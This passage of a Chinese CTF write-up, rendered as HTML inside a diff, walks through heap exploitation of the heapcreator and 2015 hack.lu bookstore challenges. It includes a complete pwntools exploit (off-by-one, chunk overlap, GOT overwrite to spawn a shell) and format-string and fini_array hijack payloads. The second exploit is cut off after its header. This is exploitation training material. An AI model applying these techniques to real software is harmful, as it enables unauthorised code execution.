+    <span class="n">_QWORD</span> <span class="o">*</span><span class="n">chunk</span><span class="p">;</span>      <span class="c1">//context 指针</span>
+<span class="p">}</span>
+</code></pre></div>
+<h3 id="_7">漏洞函数<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<p>edit 、 show 功能都存在 off-by-one ，两者出现逻辑、地方一致，造成影响的 edit ，这里就以 edit 叙述。</p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-02-7XoD5kSKWk9XAaVb.png" /></p>
+<p>可以看到 19 行写入数据的时候传入的长度参数被故意加 1 了，造成溢出可控的一字节。</p>
+<h3 id="_8">思路<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<ol>
+<li>利用 off-by-one 覆盖下一个 chunk 的 size （这里修改的是结构体 chunk ），伪造 chunk 大小</li>
+<li>释放被溢出 chunk 后，申请伪造 chunk ，造成 chunk overlap（堆重叠），从而控制新结构体的指针。</li>
+</ol>
+<p>先布置好内存空间：</p>
+<div class="highlight"><pre><span></span><code><span class="n">create</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#0</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#1</span>
+</code></pre></div>
+<p>chunk0 content 大小要求是用到下一个 chunk 的 prev_size 用于溢出修改下一个 chunk 的 size 。</p>
+<p>chunk1 content 大小最好是 0x10 ，这样我们溢出修改、释放 chunk1 后再申请一个 chunk 结构体就会用这个 chunk1 content 空间（为什么不用原来的？<a href="# 小结">小结</a>）。当然也可以用其他大小，自行调试即可。这里举一个例子：chunk1 content size 0x30 ，溢出修改结构体 size 为：0x71 。</p>
+<p>堆结构如下：</p>
+<div class="highlight"><pre><span></span><code>pwndbg&gt; x /20gx 0xac4000
+0xac4000:   0x0000000000000000  0x0000000000000021
+0xac4010:   0x0000000000000018  0x0000000000ac4030
+0xac4020:   0x0000000000000000  0x0000000000000021
+0xac4030:   0x6161616161616161  0x6161616161616161
+0xac4040:   0x0000000000000000  0x0000000000000021
+0xac4050:   0x0000000000000010  0x0000000000ac4070
+0xac4060:   0x0000000000000000  0x0000000000000021
+0xac4070:   0x6262626262626262  0x6262626262626262
+0xac4080:   0x0000000000000000  0x0000000000020f81
+0xac4090:   0x0000000000000000  0x0000000000000000
+</code></pre></div>
+<p>然后修改 chunk0 溢出修改下一个 chunk size，这里把 <code>/bin/sh\x00</code> 也一起写入：</p>
+<div class="highlight"><pre><span></span><code><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div>
+<p>修改后 chunk1 结构体就将 chunk1 content 也包含进来了，释放的时候会放入 0x40 的 fastbin 中。</p>
+<p>堆结构如下：</p>
+<div class="highlight"><pre><span></span><code>pwndbg&gt; x /20gx 0xac4000
+0xac4000:   0x0000000000000000  0x0000000000000021
+0xac4010:   0x0000000000000018  0x0000000000ac4030
+0xac4020:   0x0000000000000000  0x0000000000000021
+0xac4030:   0x0068732f6e69622f  0x6161616161616161
+0xac4040:   0x6161616161616161  0x0000000000000041  //chunk1 struct
+0xac4050:   0x0000000000000010  0x0000000000ac4070
+0xac4060:   0x0000000000000000  0x0000000000000021  //chunk1 content
+0xac4070:   0x6262626262626262  0x6262626262626262
+0xac4080:   0x0000000000000000  0x0000000000020f81
+0xac4090:   0x0000000000000000  0x0000000000000000
+</code></pre></div>
+<p>释放 chunk1</p>
+<div class="highlight"><pre><span></span><code><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>pwndbg&gt; bin
+fastbins
+0x20: 0xac4060 ◂— 0x0       //chunk1 content
+0x30: 0x0
+0x40: 0xac4040 ◂— 0x0       //chunk1 struct
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+</code></pre></div>
+<p>将这两个空闲堆申请出来，由于 malloc 机制，申请相同大小的 chunk 才会用 fastbin 中空闲内存。0x20 会用作新 chunk 的结构体，0x40 会用作新 chunk 的 content 。</p>
+<div class="highlight"><pre><span></span><code><span class="n">create</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x18</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">free_got</span><span class="p">))</span>
+</code></pre></div>
+<p>这里为了方便用 chunk1' 表示新申请的堆，实际上这个堆序号还是 1 ，堆结构如下：</p>
+<div class="highlight"><pre><span></span><code>pwndbg&gt; x /20gx 0xac4000
+0xac4000:   0x0000000000000000  0x0000000000000021
+0xac4010:   0x0000000000000018  0x0000000000ac4030
+0xac4020:   0x0000000000000000  0x0000000000000021
+0xac4030:   0x0068732f6e69622f  0x6161616161616161
+0xac4040:   0x6161616161616161  0x0000000000000041  //chunk1&#39; content
+0xac4050:   0x6161616161616161  0x6161616161616161
+0xac4060:   0x6161616161616161  0x0000000000000021  //chunk1&#39; struct
+0xac4070:   0x0000000000000030  0x0000000000602018
+0xac4080:   0x0000000000000000  0x0000000000020f81
+0xac4090:   0x0000000000000000  0x0000000000000000
+</code></pre></div>
+<p>然后就是泄露 libc 地址，修改 GOT 表，最后触发 <code>system('/bin/sh')</code></p>
+<h3 id="exp">EXP<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding: utf-8 -*-</span>
+<span class="c1"># @Author  : MrSkYe</span>
+<span class="c1"># @Email   : skye231@foxmail.com</span>
+<span class="c1"># @File    : heapcreator.py</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./heapcreator&quot;</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./heapcreator&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">context</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;choice :&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Heap : &quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;heap:&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">context</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span><span class="n">context</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;choice :&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Index :&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;heap :&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">context</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;choice :&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Index :&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;choice :&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;4&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Index :&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">exit</span><span class="p">():</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;choice :&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;5&quot;</span><span class="p">)</span>
+
+<span class="c1"># off-by-one</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#0</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#1</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1"># leak libc</span>
+<span class="n">free_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">]</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x18</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">free_got</span><span class="p">))</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Content : &quot;</span><span class="p">)</span>
+
+<span class="n">free_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;free_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">free_addr</span><span class="p">))</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">free_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;libc_base:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;system:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+<span class="c1">#gdb.attach(p)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h3 id="_9">小结<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<ul>
+<li>分配大小在 fastbin 范围内的新堆块，需要大小匹配用 fastbin 的空闲堆块。举个例子：fastbin 中有一个 0x20 的空闲堆块，需要分配一个 0x40 堆块，会从 topchunk 中分割 0x40 出来（如果可以）。</li>
+</ul>
+<h2 id="2015-hacklu-bookstore">2015 hacklu bookstore<a class="headerlink" href="#2015-hacklu-bookstore" title="Permanent link">&para;</a></h2>
+<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore">题目链接</a></p>
+<h3 id="_10">基本信息<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
+<p>64 位动态链接的程序。</p>
+<div class="highlight"><pre><span></span><code>books: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3a15f5a8e83e55c535d220473fa76c314d26b124, stripped
+
+Arch:     amd64-64-little
+RELRO:    No RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+</code></pre></div>
+<h3 id="_11">基本功能<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
+<p>程序是一个买书的系统，最多只能购买两本书。每一本书都用一个独立的堆去维护，这个堆是程序自行申请的，不能人工干预的，固定大小为 0x80 。</p>
+<p>可以新增、删除书籍，最后提交是会将两本书（两个堆）信息合并到一个新的堆中，然后进行输出。</p>
+<h3 id="_12">漏洞函数<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
+<h4 id="_13">堆溢出<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h4>
+<p>录入书籍信息用一个自定义输入函数，这个函数存在一个堆溢出的问题。结束输入的判断标准是遇到 \n ，需要注意的是自定义输入函数会在输入字符串最后加上一个 \x00 ：</p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-03-UeGvjNWMx6CKidQp.png" /></p>
+<h4 id="uaf">UAF<a class="headerlink" href="#uaf" title="Permanent link">&para;</a></h4>
+<p>程序的删除函数只是将堆释放，并没有将指针置零：</p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-03-hPFo7mUDVdOY9rRM.png" /></p>
+<h4 id="_14">格式化字符串<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h4>
+<p>程序退出打印信息时，会出现一个格式化字符串漏洞：</p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-03-3RqbLskHDRReG7NX.png" /></p>
+<h4 id="_15">奇怪的输入长度<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h4>
+<p>菜单选择输入长度上限为 0x80 ，这里不算是一个漏洞，但是会在后面利用当中运用到。</p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-S4UbIBlARivRMmeo.png" /></p>
+<h3 id="_16">思路<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>这条题目利用起来比较复杂，涉及到堆溢出、堆重叠、格式化字符串、劫持 fini_array 。下面先写出大致步骤</p>
+</blockquote>
+<ol>
+<li>free book2</li>
+<li>利用堆溢出修改在 bin 中的 book2 size 为 0x151 ，让 summit 申请的 chunk 放在这里；写入精心布置的格式化字符串和 padding ，劫持 fini_array 、泄露地址</li>
+<li>第二轮运行程序： free book2</li>
+<li>利用堆溢出修改在 bin 中的 book2 size 为 0x151 ，让 summit 申请的 chunk 放在这里；写入精心布置的格式化字符串和 padding ，修改返回地址为 one_gadget</li>
+</ol>
+<p>产生这种解题思路思考方向：先着眼简单、已经学过熟悉的漏洞，也就是格式化字符串这个漏洞。利用格式化字符串的话，就是修改 got 表或者返回地址等控制程序流程 getshell 。</p>
+<ol>
+<li>这里 格式化字符串 出现在最后一个 printf ，也就是输出完成之后程序就会退出。</li>
+<li>格式化字符串的内容是从 submit  申请的 dest 中读取的。</li>
+<li>用户无法自行分配堆，只能从程序本身申请的 3 块堆和 submit 功能设法利用。</li>
+</ol>
+<h4 id="_17">控制格式化字符串内容<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h4>
+<p>先来解决格式化字符串内容的问题。内容是从 dest 中读取的，就要设法控制 dest  内容。这里利用的是 overlapping 堆重叠，将 chunk2 和 chunk3 重叠起来，利用 submit 复制功能溢出控制 dest 中的内容。</p>
+<p>造成 overlapping 先 free chunk2 ，再通过写入 book1 功能溢出修改 chunk2 的 size 字段为 0x151 。这样当 submit 功能申请 0x140 堆块（不含chunk header）的时候就会去到 unsortedbin 中找到被我们修改大小为 0x151 的 chunk2 。</p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-1f1IV0WHxcpMxOvo.png" /></p>
+<p>submit 功能正常情况下复制的内容是这样的：</p>
+<div class="highlight"><pre><span></span><code>&quot;Order 1: &quot; + book1 + &quot;\nOrder 2: &quot; + book2 + &#39;\n&#39;
+</code></pre></div>
+<p>但是我们将 chunk2 chunk3 重叠在一起，且 chunk header 是同一地址。简单点就是两个堆开始地址相同，结束地址不同。</p>
+<p>chunk1 chunk2 地址指针运行过程中没有被二次赋值，一直保存着申请堆时的地址。（free chunk2 时因为有 UAF 漏洞，所以没被重置。）造成的影响就是 chunk2 的内容 submit 的时候被写为 <code>"Order 1: " + book1</code>，详细过程如下：</p>
+<ol>
+<li>submit 处理 chunk1 信息，向 chunk3（即chunk2）写入：</li>
+</ol>
+<div class="highlight"><pre><span></span><code>&quot;Order 1: &quot; + book1
+</code></pre></div>
+<ol>
+<li>submit 处理 chunk2 信息，向 chunk3（即chunk2）写入：</li>
+</ol>
+<div class="highlight"><pre><span></span><code>&quot;\nOrder 2: &quot; + &quot;Order 1: &quot; + book1 + &#39;\n&#39;
+</code></pre></div>
+<p>先看看 chunk1、chunk2（chunk3）、dest 三个堆的分布情况：</p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-waueydoBLLdD7QWO.png" /></p>
+<p>我们控制 chunk1 内容，写入有效 payload 和 padding ，将有效 payload 溢出写入到 dest （fd 指针处开始）。换句话就是我们希望图上 0xef3010 开始写入的内容，复制到 0xef3130 。可以得出计算公式：（"" 不算个数）</p>
+<div class="highlight"><pre><span></span><code># 需要在复制第二个chunk1前，填充好0x90字节，也就是chunk2(3) fd开始到dest fd开始的距离，这样chunk1就会被复制到dest fd开始
+&quot;Order 1:&quot; + chunk1 + &quot;\n&quot; + &quot;Order 2:&quot; + &quot;Order 1:&quot; == 0x90
+# 化简为
+chunk1 == 0x90 - 28 == 0x74
+</code></pre></div>
+<p>得出结论：将有效 payload 写在 chunk1 开头，然后将 chunk1 用非 \x00 填充长度为 0x74 ，当submit 的时候，有效 payload 就会放在 dest 的 fd 。这样就获得一个任意读写的格式化字符串，需要利用格式化字符串泄露、修改提前在修改 chunk1 时写入即可。</p>
+<p>目前得出 payload ：</p>
+<div class="highlight"><pre><span></span><code><span class="n">payload1</span> <span class="o">=</span> <span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mi">8</span>    <span class="c1">#格式化字符串</span>
+<span class="n">payload1</span> <span class="o">=</span> <span class="n">payload1</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x74</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x151</span><span class="p">)</span>  
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">payload1</span><span class="p">)</span>
+</code></pre></div>
+<h4 id="fini_array">劫持 fini_array<a class="headerlink" href="#fini_array" title="Permanent link">&para;</a></h4>
+<p>格式化字符串内容已经设法控制了，但是 getshell 需要两次使用这个漏洞，一次泄露地址，一次修改地址。</p>
+<p>这里就需要用到一个知识，main 函数是二弟，他有大哥，有三弟。程序开始先运行一次大哥，在运行 main ，最后运行三弟。三弟当做有个数组：<code>.fini_array</code> 。程序退出后会执行 <code>.fini_array</code> 地址出的函数，不过只能利用一次（动态链接程序）。</p>
+<p>所以我们可以在格式化字符串的第一轮泄露地址的同时，修改 .fini_array 的地址为 main 函数地址，让程序重新运行一次。main 函数地址易知，关键是 .fini_array 地址怎么找。</p>
+<blockquote>
+<p>动态链接与静态链接查找和利用有差别，为了篇幅将两者区别放在最后。对 64 位静态程序劫持 fini_array 有兴趣可以看看：<a href="https://www.mrskye.cn/archives/173/">劫持 64 位 fini_array 进行 ROP 攻击</a></p>
+</blockquote>
+<h5 id="way-1">Way 1<a class="headerlink" href="#way-1" title="Permanent link">&para;</a></h5>
+<p>IDA 中 <code>Ctrl+S</code> 查找 .fini_array 地址，可以看到这个数组空间大小为 8 字节，只能放一个地址，这是与静态程序的一个区别（静态有两个地址）。</p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-ztIjbG96doGOhSfu.png" /></p>
+<h5 id="way-2">Way 2<a class="headerlink" href="#way-2" title="Permanent link">&para;</a></h5>
+<p>用 gdb 调试程序，输入 <code>elf</code> 查找 .fini_array </p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-qQxmRkH3KtjuybNr.png" /></p>
+<p>要素具备但是遇到一个问题，格式化字符串的内容是存放在堆上，栈上面只有该堆的指针而已。类似题目：ctf-wiki 的<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_example-zh/#_22">堆上的格式化字符串漏洞</a> 。</p>
+<p>这道题目我们不搞栈迁移到堆上面，而是利用菜单的奇怪输入长度，将地址写入到栈上。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 为了对齐前面填充8字节用来放菜单选项，fini_array偏移为13</span>
+<span class="c1"># 泄露libc可以用__libc_start_main也可以和我一样自己往栈上写一个</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="s1">&#39;5&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fini_array</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_got</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;5: Submit</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+</code></pre></div>
+<p>泄露 libc 地址和劫持 fini_array payload 目前构造：</p>
+<div class="highlight"><pre><span></span><code><span class="n">payload1</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%2617c</span><span class="s2">%13$hn&quot;</span> <span class="o">+</span> <span class="s1">&#39;|&#39;</span> <span class="o">+</span> <span class="s2">&quot;%14$s&quot;</span>
+<span class="n">payload1</span> <span class="o">=</span> <span class="n">payload1</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x74</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x151</span><span class="p">)</span>      
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">payload1</span><span class="p">)</span>
+</code></pre></div>
+<h4 id="main">修改 main 函数返回地址<a class="headerlink" href="#main" title="Permanent link">&para;</a></h4>
+<p>到这里我们就获取了 libc_base 地址并且进入了第二次的 main 函数。下一步就是如何利用了。</p>
+<p>就 free got 表改为 onegadget ？在这里不行，因为修改玩之后需要触发，也就是再一次进入 main 函数触发 free 函数。第二次进入 main 函数实际上是在 __libc_csu_fini 这个退出函数中调用 fini_array 数组中存储的函数（main），当执行完 main ，就会继续完成退出函数，然后正常退出程序。</p>
+<p>这里有两个思路：</p>
+<ol>
+<li>同第一次 mian 中，泄露出栈地址，通过调试获取到第二次 main 的返回地址与泄露栈地址的偏移，就可以获取到 main rip 的栈地址，我们对此进行修改。</li>
+<li>修改退出函数当中某个函数的 got 表，当完成退出函数调用这个函数就会 getshell。</li>
+</ol>
+<p>第二种思路是有几次比赛出现过这种利用方法，但没有在这道题目上尝试，主要是太费劲了。这道题就用第一种方法，就是需要我们泄露出 栈地址 ，然后因为栈结构固定，所以通过偏移算出第二 main 函数的返回地址。</p>
+<p>通过调试查看第一个 main 函数的栈空间结构体：</p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-7YehpeGp46LWyAuO.png" /></p>
+<p>在格式化字符串的时候把这个地址也泄露出来：</p>
+<div class="highlight"><pre><span></span><code><span class="n">payload1</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%2617c</span><span class="s2">%13$hn&quot;</span> <span class="o">+</span> <span class="s1">&#39;|&#39;</span> <span class="o">+</span> <span class="s2">&quot;%14$s&quot;</span> <span class="o">+</span> <span class="s1">&#39;-&#39;</span> <span class="o">+</span> <span class="s2">&quot;%24$p&quot;</span>
+<span class="n">payload1</span> <span class="o">=</span> <span class="n">payload1</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x74</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x151</span><span class="p">)</span>      
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">payload1</span><span class="p">)</span>
+</code></pre></div>
+<p>再次通过调试找到第二次 main 函数返回地址，然后计算固定偏移：</p>
+<div class="highlight"><pre><span></span><code><span class="mh">0x7ffea45d8980</span><span class="o">-</span><span class="mh">0x7ffea45d887a</span><span class="o">=</span><span class="mh">0x106</span>
+</code></pre></div>
+<p>所以得出计算公式：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># ret_addr 为泄露地址</span>
+<span class="n">attack_addr</span> <span class="o">=</span> <span class="n">ret_addr</span> <span class="o">-</span> <span class="mh">0x106</span>
+</code></pre></div>
+<p>第二次进入 main 函数的利用思路就出来了，和第一次进入一样，先释放 chunk2 造成 overlapping 堆重叠，控制 dest 内容从而控制格式化字符串内容。利用格式化字符串修改第二次 main 函数的返回地址为 onegadget 。</p>
+<h3 id="exp_1">exp<a class="headerlink" href="#exp_1" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding: utf-8 -*-</span>
+<span class="c1"># @Author  : MrSkYe</span>
+<span class="c1"># @Email   : skye231@foxmail.com</span>
